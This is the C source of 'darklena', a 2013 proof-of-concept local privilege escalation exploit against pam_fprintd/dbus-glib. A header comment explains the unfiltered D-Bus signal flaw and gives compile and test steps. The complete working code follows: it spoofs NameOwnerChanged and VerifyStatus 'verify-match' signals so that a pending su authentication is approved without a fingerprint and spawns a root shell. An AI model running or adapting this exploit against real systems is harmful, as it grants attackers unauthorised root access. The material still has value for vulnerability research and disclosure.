/* darklena. fprintd/pam_fprintd local root PoC. However dbus-glib plays an important role.
 *
 * (C) 2013 Sebastian Krahmer, all rights reversed.
 *
 * pam_fprintd uses net.reactivated.Fprint service to trigger finger swiping and
 * registers DBUS signal inside the PAM authentication function:
 *
 *       dbus_g_proxy_add_signal(dev, "VerifyStatus", G_TYPE_STRING, G_TYPE_BOOLEAN, NULL);
 *       dbus_g_proxy_add_signal(dev, "VerifyFingerSelected", G_TYPE_STRING, NULL);
 *       dbus_g_proxy_connect_signal(dev, "VerifyStatus", G_CALLBACK(verify_result),
 *                                   data, NULL);
 *
 * Then, when the DBUS signal arrives, the signal argument is basically just checked
 * to be the "verify-match" string; which however is expected to come from the legit
 * net.reactivated.Fprint service. Since there is no message filter registered in either
 * pam_fprintd, nor inside dbus-glib which it is using, such signals can be spoofed
 * by anyone. In order to do so, we first need to spoof a NameOwnerChanged signal
 * so the dbus_g_proxy_manager_filter() function inside dbus-glib will find our
 * sender-name (which cannot be spoofed) inside its hash tables and match it to
 * net.reactivated.Fprint.
 *
 * To test this PoC, start a service (su is fine) as user that is using pam_fprintd.
 * On a second xterm, when you see 'Swipe your ... finger' message start this PoC
 * and you will notice that a rootshell is spawned in the first xterm w/o giving your finger. :p
 *
 * Used various DBUS tutorials and example code, while writing this.
 *
 * $ cc darklena.c `pkg-config --cflags dbus-1` -ldbus-1 -Wall
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <dbus/dbus.h>


void die(const char *s)
{
  perror(s);
  exit(errno);
}


int main(int argc, char **argv)
{
  DBusError err;
  DBusConnection *conn = NULL;
  DBusMessage *vrfy_msg = NULL, *noc_msg = NULL, *nl_msg = NULL, *reply = NULL;
  dbus_uint32_t serial = 0;
  dbus_bool_t t = 1;
  int un = 0, i = 0, reply_to = -1;
  const char *vrfy_match = "verify-match", *cname = NULL,
             *name = "net.reactivated.Fprint", *prev_owner = NULL;
  char dest[32];

  /* override unique name of net.reactivated.Fprint */
  if (argc > 1)
    prev_owner = strdup(argv[1]);

  printf("\n[**] darklena, pam_fprintd PoC exploit 2013\n\n");

  printf("[*] Initializing DBUS ...\n");
  dbus_error_init(&err);
  conn = dbus_bus_get(DBUS_BUS_SYSTEM, &err);

  if (dbus_error_is_set(&err)) {
    fprintf(stderr, "Error: %s\n", err.message);
    die("dbus_error_is_set");
  }

  if ((cname = dbus_bus_get_unique_name(conn)) == NULL)
    die("dbus_bus_get_unique_name");

  un = atoi(strchr(cname, '.') + 1);

  printf("[+] Done. Found my unique name: %s (%d)\n", cname, un);

  if (!prev_owner) {
    printf("[*] Trying to find unique name of '%s' ...\n", name);
    nl_msg = dbus_message_new_method_call("org.freedesktop.DBus",
                                          "/org/freedesktop/DBus",
                                            "org.freedesktop.DBus",
                                          "GetNameOwner");

    if (!dbus_message_append_args(nl_msg, DBUS_TYPE_STRING, &name, DBUS_TYPE_INVALID))
      die("[-] dbus_message_append_args");

    reply = dbus_connection_send_with_reply_and_block(conn, nl_msg, reply_to, &err);
    dbus_message_unref(nl_msg);

    if (dbus_error_is_set(&err)) {
      fprintf (stderr, "[-] Error: %s\n", err.message);
      die("[-] dbus_connection_send_with_reply_and_block");
    }

    if (!dbus_message_get_args(reply, &err,
                               DBUS_TYPE_STRING, &prev_owner, DBUS_TYPE_INVALID)) {
      fprintf(stderr, "[-] Error: %s\n", err.message);
      die("[-] dbus_message_get_args");
    }

    dbus_message_unref(reply);
  }

  printf("[+] Found unique name of '%s' as '%s'\n", name, prev_owner);

  for (i = 1; i < 20; ++i) {
    /* spoof a NameOwnerChanged signal */
    noc_msg = dbus_message_new_signal("/org/freedesktop/DBus",
                                      "org.freedesktop.DBus",
                                      "NameOwnerChanged");

    /* spoof a VerifyStatus */
    vrfy_msg = dbus_message_new_signal("/net/reactivated/Fprint/Device/0",
                                             "net.reactivated.Fprint.Device",
                                             "VerifyStatus");

    if (!vrfy_msg || !noc_msg)
      die("[-] dbus_message_new_signal");

    if (!dbus_message_append_args(noc_msg, DBUS_TYPE_STRING, &name, DBUS_TYPE_STRING,
                                  &prev_owner, DBUS_TYPE_STRING, &cname, DBUS_TYPE_INVALID))
      die("[-] dbus_message_append_args1");

    if (!dbus_message_append_args(vrfy_msg, DBUS_TYPE_STRING, &vrfy_match,
                                  DBUS_TYPE_BOOLEAN, &t, DBUS_TYPE_INVALID))
      die("[-] dbus_message_append_args2");

    /* iterate over unique names short below under our own
     * to hit the previously started su
     */
    snprintf(dest, sizeof(dest), ":1.%d", un - i);
    printf("[*] Using new destination: %s\n", dest);

    if (!dbus_message_set_destination(vrfy_msg, dest))
      die("[-] dbus_message_set_destination");

    if (!dbus_message_set_destination(noc_msg, dest))
      die("[-] dbus_message_set_destination");

    if (!dbus_connection_send(conn, noc_msg, &serial))
      die("[-] dbus_connection_send");

    dbus_connection_flush(conn);
    usleep(1000);

    if (!dbus_connection_send(conn, vrfy_msg, &serial))
      die("[-] dbus_connection_send");

    dbus_connection_flush(conn);

    dbus_message_unref(vrfy_msg);
    dbus_message_unref(noc_msg);
  }

  printf("\n[**] Here comes the pain! (but no one's to too innocent to die)\n");
  return 0;
}
